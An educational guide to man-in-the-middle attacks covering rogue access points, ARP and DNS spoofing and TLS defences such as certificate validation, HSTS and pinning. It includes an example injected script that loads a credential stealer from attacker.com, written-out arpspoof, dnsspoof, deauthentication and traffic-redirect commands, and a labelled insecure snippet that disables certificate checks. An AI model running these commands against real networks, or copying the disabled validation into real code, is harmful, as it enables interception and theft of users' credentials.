# Man-in-the-Middle (MitM) Attacks

## Definition

A Man-in-the-Middle (MitM) attack occurs when an attacker intercepts communication between two parties and positions themselves in the middle of the conversation. The attacker can:

- **Eavesdrop**: Read all communication (if unencrypted)
- **Modify messages**: Alter data in transit
- **Impersonate**: Pretend to be either party
- **Inject data**: Insert malicious content

The attacker doesn't need to break encryption; they simply insert themselves into the communication path.

## Attack Scenarios

### Scenario 1: Public WiFi (Rogue Access Point)

```
1. Attacker sets up fake WiFi hotspot:
   SSID: "AirportWiFi" or "Starbucks_Free"
   (Same name as legitimate network or attractive name)

2. Victim connects to attacker's network
   (Victims choose the attacker's network because it has better signal or right name)

3. Victim's traffic flows through attacker's computer:
   Victim ←→ Attacker ←→ Internet

4. Attacker can:
   - See all HTTP traffic in plaintext
   - Modify HTTP responses (inject JavaScript, malware)
   - Steal credentials, cookies, session tokens
   - Downgrade HTTPS to HTTP (SSL stripping)

Example:
Victim visits: http://bank.example.com/login
Attacker intercepts and modifies response:
<script src="http://attacker.com/stealer.js"></script>
// Stealer.js sends form data to attacker's server

Victim enters credentials thinking connection is secure
Attacker captures credentials
```

### Scenario 2: Rogue Access Point (Compromised Network)

```
1. Attacker compromises router on network
   - Corporate network
   - ISP's router
   - DNS server

2. Attacker configures router to intercept traffic:
   iptables -t mangle -A PREROUTING -j REDIRECT --to-ports 8888
   (Force all traffic through proxy)

3. All users on that network are compromised
   - Home network: Attacker accesses router
   - Corporate: Attacker has network access
   - ISP level: Attacker controls ISP equipment

4. Attacker gains complete visibility into:
   - All HTTP connections (plaintext)
   - HTTPS: Can see domain, not content (yet)
```

### Scenario 3: ARP Spoofing

```
1. Attacker sends spoofed ARP (Address Resolution Protocol) packets
   ARP tells devices: "My MAC address is [ATTACKER_MAC], I'm the gateway"

2. Victim's device updates ARP table:
   Gateway 192.168.1.1 → MAC: ATTACKER_MAC (actually attacker's computer)
   Real router's MAC: 00:11:22:33:44:55 → MAC: ATTACKER_MAC (spoofed)

3. Victim's traffic routes through attacker:
   Victim → [meant for router] → Attacker → Real Router

4. Same as rogue AP: Attacker sees all traffic

Tool used: arpspoof, Cain and Abel, etc.

Example:
   arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
   (Tells 192.168.1.100 that attacker is the gateway 192.168.1.1)
```

### Scenario 4: DNS Spoofing

```
1. Attacker intercepts DNS requests:
   Victim: "What's the IP of bank.example.com?"
   Attacker: "It's 10.0.0.1" (attacker's IP, not bank's)

2. Victim connects to attacker's server thinking it's the bank
   Victim → Attacker (who impersonates bank)

3. Attacker can:
   - Show fake login page
   - Steal credentials
   - Show fake content
   - Inject malware

Attack methods:
- Compromise DNS server
- ARP spoofing + local DNS hijacking
- DHCP spoofing (provide rogue DNS server)
- Man-in-the-middle on unencrypted DNS traffic
```

## What an Attacker Can See and Do Without TLS

### Without Encryption (HTTP)

```
GET /api/bank/balance HTTP/1.1
Host: bank.example.com
Cookie: sessionid=abc123def456
Authorization: Basic dXNlcjpwYXNz
```

Attacker sees (in plaintext):
- URL path: /api/bank/balance
- Query parameters: ?account=12345&pin=1234
- Cookies: sessionid=abc123def456
- Authorization headers: dXNlcjpwYXNz (base64 of username:password)
- Request body: username, password, credit card numbers, etc.
- Response body: Account balance, personal data, etc.

### Attacker Capabilities

```
1. Eavesdropping:
   - Read all data
   - Steal passwords
   - Steal session cookies
   - Steal API keys

2. Data Modification:
   - Change amounts in banking transaction
   - Modify email content
   - Inject advertisements
   - Inject malware

3. Impersonation:
   - Use stolen cookies to impersonate user
   - Use stolen API keys
   - Perform actions on behalf of victim

4. Injection:
   - Inject JavaScript into HTML pages
   - Inject CSS to hide form fields
   - Inject images/iframes pointing to attacker's server
   - Inject links to phishing pages
```

## Tools Attackers Use

### Packet Capture Tools

- **Wireshark**: Network packet analyzer
  ```bash
  wireshark -i eth0  # Capture all traffic on interface
  # Filter for HTTP: tcp.port == 80
  # Decrypt HTTPS if you have the SSL key
  ```

- **tcpdump**: Command-line packet capture
  ```bash
  tcpdump -i eth0 -w capture.pcap  # Save to file
  tcpdump -i eth0 'tcp port 80'    # Filter HTTP
  ```

### Network Interception/Proxying

- **Mitmproxy**: HTTP/HTTPS intercepting proxy
  ```bash
  mitmproxy -p 8080
  # Intercept, view, modify requests and responses
  # Can decrypt HTTPS if certificate authority is installed
  ```

- **Burp Suite**: Security testing proxy
  ```bash
  # Capture traffic, modify requests, test security
  # Can intercept and modify HTTPS if cert is trusted
  ```

### Network Spoofing

- **arpspoof**: ARP spoofing tool
  ```bash
  arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
  # Make victim's traffic route through attacker
  ```

- **dnsspoof**: DNS spoofing
  ```bash
  dnsspoof -i eth0 -f hosts.txt
  # Return attacker's IP for specified domains
  ```

### WiFi Tools

- **Aircrack-ng**: WiFi network testing
  ```bash
  airmon-ng start wlan0           # Start monitor mode
  airodump-ng wlan0mon            # Scan networks
  aireplay-ng -0 10 -a BSSID      # Deauthentication attack
  ```

- **Hostapd**: Create fake access point
  ```bash
  hostapd hostapd.conf
  # Create rogue AP with same SSID as legitimate network
  ```

## How TLS/HTTPS Prevents MitM

### Encryption

```
Without TLS:
Attacker reads: GET /api/bank/balance?account=12345&pin=1234

With TLS:
Attacker sees: [binary encrypted data]
Attacker cannot decrypt (doesn't have the key)
```

TLS encrypts the entire HTTP request and response, making it unreadable to anyone without the encryption key.

### Server Authentication

```
Without TLS:
Attacker: "I'm bank.example.com"
Victim: *trusts attacker*

With TLS:
Server sends certificate signed by trusted Certificate Authority
Victim verifies certificate is legitimately from bank.example.com
Victim trusts communication

Attacker's strategy:
- Try to use their own certificate
- Browser rejects it (not signed by trusted CA, domain mismatch)
- Victim sees warning
```

### Man-in-the-Middle Becomes Impossible

With TLS, attacking becomes much harder:

```
1. Victim → Attacker → Real Server (TLS handshake)

2. Attacker tries to act as server:
   Victim asks: "Can you prove you're bank.example.com?"
   Attacker responds with own certificate
   Victim's browser checks:
   - Is certificate signed by trusted CA? NO
   - Does domain match? NO
   - Is certificate valid? NO

3. Victim's browser shows warning:
   "Certificate does not match domain"
   "Certificate authority is not trusted"

4. Victim can choose to proceed (risky) or refuse
   Most users refuse

Result: Attacker's attempt is thwarted
```

## Certificate Validation

Even with TLS, certificate validation is critical:

### Vulnerable: Ignoring Certificate Errors

```javascript
// VULNERABLE: Disables certificate validation
const https = require('https');
const agent = new https.Agent({
  rejectUnauthorized: false  // DANGEROUS: Accepts invalid certificates
});

https.get('https://bank.example.com', { agent }, (res) => {
  // This would connect even if certificate is invalid
  // Attacker can SSL strip/MitM this connection
});
```

### Secure: Validating Certificates

```javascript
// SECURE: Default behavior validates certificates
const https = require('https');

https.get('https://bank.example.com', (res) => {
  // Certificate is validated automatically
  // If certificate is invalid, connection is rejected
  // Errors thrown if:
  // - Certificate not signed by trusted CA
  // - Domain doesn't match certificate
  // - Certificate is expired
});

// Verify certificate in application code
https.get('https://api.example.com', (res) => {
  const cert = res.socket.getPeerCertificate();

  // Verify subject matches expected domain
  if (cert.subject.CN !== 'api.example.com') {
    throw new Error('Certificate domain mismatch');
  }

  // Check certificate validity period
  const now = Date.now();
  const notBefore = new Date(cert.valid_from).getTime();
  const notAfter = new Date(cert.valid_to).getTime();

  if (now < notBefore || now > notAfter) {
    throw new Error('Certificate not valid');
  }
});
```

## HSTS and Certificate Pinning as Additional Layers

### HSTS (HTTP Strict Transport Security)

Prevents SSL stripping attacks:

```
With HSTS:
1. Browser stores: "bank.example.com requires HTTPS"
2. All future requests automatically use HTTPS
3. Attacker cannot trick browser into using HTTP
4. Even if attacker intercepts, browser rejects HTTP responses
```

### Certificate Pinning

Pins to specific certificates to prevent CA compromise:

```javascript
const https = require('https');
const crypto = require('crypto');

// Pin to specific certificate public key
const pinnedPublicKey = 'sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=';

https.get('https://api.example.com', (res) => {
  const cert = res.socket.getPeerCertificate();
  const publicKeyDer = cert.pubkey;
  const publicKeyHash = crypto
    .createHash('sha256')
    .update(publicKeyDer)
    .digest('base64');

  if (`sha256/${publicKeyHash}` !== pinnedPublicKey) {
    throw new Error('Certificate pinning validation failed!');
  }

  // Connection is secure, use response
});
```

This prevents attacks where:
- CA is compromised
- Attacker has a valid certificate for your domain (from compromised CA)
- With pinning, only your specific certificate (or backup) is trusted

## Best Practices for Developers

1. **Always use HTTPS**: Never use unencrypted HTTP for sensitive data
2. **Validate certificates**: Don't disable certificate validation (rejectUnauthorized: true)
3. **Implement HSTS**: Set Strict-Transport-Security header to prevent SSL stripping
4. **Use strong TLS versions**: Require TLS 1.2 or higher
5. **Use secure cipher suites**: Prefer ECDHE (Perfect Forward Secrecy)
6. **Implement certificate pinning**: For critical APIs, pin to specific certificates
7. **Monitor certificate expiration**: Automated alerts when certificates expire
8. **Use Certificate Transparency logs**: Monitor for unauthorized certificate issuance
9. **Secure password handling**: Use bcrypt, scrypt, argon2 (not plaintext)
10. **Use secure cookies**: httpOnly, Secure, SameSite attributes
11. **Implement authentication properly**: Don't rely on SSL alone
12. **Use VPN for untrusted networks**: Employees on public WiFi should use VPN
13. **Encrypt sensitive data at rest**: Not just in transit
14. **Educate users**: Teach them to recognize HTTPS, certificate warnings
15. **Test security regularly**: Penetration testing, vulnerability scanning, security audits

## Best Practices for Users/Organizations

1. **Use HTTPS everywhere**: Avoid sites without HTTPS
2. **Use VPN on public WiFi**: Never access sensitive data on unencrypted networks
3. **Verify certificate details**: Check certificate when browser shows warnings
4. **Use strong passwords**: Even if TLS is in place, weak passwords are vulnerable
5. **Enable two-factor authentication**: Mitigates credential theft
6. **Use password managers**: Helps avoid phishing, ensures complex passwords
7. **Keep software updated**: Security patches for browsers, OS, applications
8. **Use security awareness training**: Recognize phishing, social engineering
9. **Monitor account activity**: Watch for suspicious logins, transactions
10. **Use device security**: Firewalls, antivirus, endpoint detection
